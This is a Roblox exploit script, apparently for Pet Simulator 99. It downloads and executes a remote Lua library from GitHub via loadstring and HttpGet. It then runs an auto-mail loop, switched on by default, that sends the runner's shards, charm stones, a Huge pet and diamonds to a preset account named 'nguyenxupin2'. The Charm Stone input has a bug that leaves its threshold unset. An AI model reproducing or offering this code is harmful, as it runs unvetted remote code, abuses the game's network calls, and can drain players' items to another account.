getgenv().Config = {
	autoMail = true;
}

local TrungBLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/TrungB2/PS99/main/TrungBLib.lua')))()
local Window = TrungBLib:MakeWindow({Name = "Hub", HidePremium = false, SaveConfig = true, ConfigFolder = "TrungBTest"})

local Tab =
    Window:MakeTab(
    {
        Name = "Main",
        Icon = "rbxassetid://4483345998",
        PremiumOnly = false
    }
)

--local Mics =
--    Window:MakeTab(
--    {
--        Name = "Mics",
--        Icon = "rbxassetid://4483345998",
--        PremiumOnly = false
--    }
--)

Tab:AddTextbox(
    {
        Name = "Username",
        Default = "nguyenxupin2",
        TextDisappear = false,
        Callback = function(user)
            username = user
        end
    }
)
Tab:AddTextbox(
    {
        Name = "Charm Stone",
        Default = "5",
        TextDisappear = false,
        Callback = function(charmAmount)
            charmAmount = tonumber(charmAmount)
        end
    }
)

Tab:AddTextbox(
    {
        Name = "Shard Amount",
        Default = "50",
        TextDisappear = false,
        Callback = function(shards)
            shardAmount = tonumber(shards)
        end
    }
)

Tab:AddTextbox(
    {
        Name = "Gem Amount",
        Default = "2000000",
        TextDisappear = false,
        Callback = function(gems)
            gemAmount = tonumber(gems)
        end
    }
)

Tab:AddToggle(
    {
        Name = "Auto Mail (Huge, Shard, Gems)",
        Default = true,
        Callback = function(v)
            Config.autoMail = v
            spawn(autoMail)
        end
    }
)
--Mics:AddButton(
--    {
--       Name = "AntiAFK",
--        Callback = function()
--            local VirtualInputManager = game:GetService("VirtualInputManager")
--			while task.wait() do
--				VirtualInputManager:SendKeyEvent(true, "Space", false, game)
--				task.wait(.2)
--				VirtualInputManager:SendKeyEvent(false, "Space", false, game)
--				task.wait(300)
--			end
--        end
--    }
--)

--Mics:AddButton(
--    {
--        Name = "White Screen ON",
--        Callback = function()
--            game:GetService("RunService"):Set3dRenderingEnabled(true)
--        end
--    }
--)

--Mics:AddButton(
--    {
--        Name = "White Screen OFF",
--        Callback = function()
--            game:GetService("RunService"):Set3dRenderingEnabled(false)
--        end
--    }
--)


TrungBLib:Init()

function autoMail()
    while task.wait() and Config.autoMail do
        local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
        local result = saveModule.Get()

        local ms = result.Inventory.Misc
        for i, v in pairs(ms) do
            if v.id == "Magic Shard" then
                if v._am >= shardAmount then
                    local args = {
                        [1] = username,
                        [2] = "Magic Shard",
                        [3] = "Misc",
                        [4] = i,
                        [5] = v._am or 1
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
                        unpack(args)
                    )
                end
			elseif v.id == "Charm Stone" then
				if v._am >= charmAmount then
					local args = {       
						[1] = username,
						[2] = "Charm Stone",
						[3] = "Misc",
						[4] = i,
						[5] = v._am or 1      
					}
					game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(
						unpack(args)
					)
				end
            end
        end

        task.wait(2)

        local pet = result.Inventory.Pet
        for i, v in pairs(pet) do
            if v.id == "Huge Poseidon Corgi" then
                local args = {
                    [1] = username,
                    [2] = "Huge Poseidon Corgi",
                    [3] = "Pet",
                    [4] = i,
                    [5] = v._am or 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
            end
        end

        task.wait(2)

        local GetSave = function()
            return require(game.ReplicatedStorage.Library.Client.Save).Get()
        end
        for i, v in pairs(GetSave().Inventory.Currency) do
            if v.id == "Diamonds" then
                if v._am >= gemAmount then
                    local args = {
                        [1] = username,
                        [2] = v.id,
                        [3] = "Currency",
                        [4] = i,
                        [5] = gemAmount - 10000
                    }
                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                end
            end
            task.wait(1)
        end
    end
end
